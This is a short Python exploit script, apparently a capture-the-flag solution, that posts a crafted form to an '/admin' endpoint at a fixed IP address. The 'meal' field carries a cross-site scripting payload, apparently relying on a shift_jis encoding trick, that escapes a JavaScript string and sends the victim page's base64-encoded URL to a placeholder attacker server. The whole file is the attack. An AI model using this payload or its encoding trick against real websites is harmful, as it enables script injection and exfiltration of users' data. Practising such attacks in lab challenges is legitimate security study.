import requests

url = "http://160.251.83.96:31415/"
your_server = "http://XXXXX/"
response = requests.post(url + "/admin", data={"price":"十","meal":f"\"-(location.href=`//{your_server.replace('http://', '').replace('https://', '')}?s=`+btoa(location.href));alert=function(){{}};//","encoding":"shift_jis"})
print(response.text)